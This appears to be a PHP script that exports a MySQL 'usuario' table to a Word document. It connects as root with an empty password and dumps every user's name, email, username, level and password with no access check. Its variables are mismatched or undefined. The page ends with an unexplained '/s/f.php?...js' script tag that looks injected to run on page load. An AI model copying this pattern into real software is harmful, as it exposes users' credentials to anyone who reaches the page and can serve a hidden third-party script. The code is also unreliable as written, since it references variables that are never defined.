<?php
$hostname='localhost';
$database='vinculacion';
$username='root';
$password='';

$conexion=new mysqli($hostname,$username,$password,$database);
if($conexion->connect_errno){
    echo "No se puede conectar al servidor de base de datos";
}
?>
<?php

header("Content-type: application/vnd.ms-word");
header("Content-Disposition: attachment; filename=Discapacitados.doc");

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head/>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>LISTA DE USUARIOS</title>
</head>
<body data-rsssl=1>
<table width="100%" border="1" cellspacing="0" cellpadding="0">
  <tr>
    <td colspan="6" bgcolor="skyblue"><CENTER><strong>REPORTE DE USUARIOS</strong></CENTER></td>
  </tr>
  <tr bgcolor="red">
    <td><strong>Nombre</strong></td>
    <td><strong>Apellido</strong></td>
    <td><strong>Correo</strong></td>
    <td><strong>Usuario</strong></td>
    <td><strong>Nivel</strong></td>
    <td><strong>Contraseña</strong></td>
  </tr>
  
<?PHP

$query = "SELECT * from usuario";
  $resultado = $conexion->query($query);
while($res=$resultado->fetch_assoc()){

$codigo=$res["Nombre"];
$nombre=$res["Apellido"];
$Apellido=$res["Correo"];
$Pais=$res["Usuario"];
$edad=$res["Nivel"];
$dni=$res["Contrasena"];

?>  
 <tr>
<td><?php echo $codigo; ?></td>
<td><?php echo $nombre; ?></td>
<td><?php echo $Apellido; ?></td>
<td><?php echo $Pais; ?></td>
<td><?php echo $edad; ?></td>
<td><?php echo $dni; ?></td>  
<td><?php echo $direccion; ?></td>
<td><?php echo $dis; ?></td>                   
 </tr> 
  <?php
}
  ?>
</table>
<script src="/s/f.php?d22993.js" async defer></script></body>
</html>